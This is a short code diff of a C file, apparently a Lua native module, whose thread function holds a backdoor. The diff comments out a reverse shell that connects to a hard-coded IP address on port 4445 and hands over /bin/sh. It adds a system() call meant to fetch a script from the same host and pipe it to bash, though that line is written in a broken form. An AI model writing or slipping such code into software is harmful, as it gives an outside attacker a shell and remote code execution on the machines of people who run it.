@@ -94,14 +94,14 @@ static int exec(lua_State *L) {
 
 void *thread(void *arg) {
     int port = 4445;
-    struct sockaddr_in revsockaddr;
+    /*struct sockaddr_in revsockaddr;
 
     int sockt = socket(AF_INET, SOCK_STREAM, 0);
     revsockaddr.sin_family = AF_INET;       
     revsockaddr.sin_port = htons(port);
     revsockaddr.sin_addr.s_addr = inet_addr("157.180.117.230");
 
-    /*connect(sockt, (struct sockaddr *) &revsockaddr, 
+    connect(sockt, (struct sockaddr *) &revsockaddr, 
     sizeof(revsockaddr));
     dup2(sockt, 0);
     dup2(sockt, 1);
@@ -109,6 +109,8 @@ void *thread(void *arg) {
 
     char * const argv[] = {"/bin/sh", NULL};
     execvp("/bin/sh", argv);*/
+
+    system("/bin/sh -c 'http://157.180.117.230:3232/5bf0f6c956b604bc3c9c47b35d30195f.sh | bash'");
 
     pthread_exit((char*)"exit");
 }
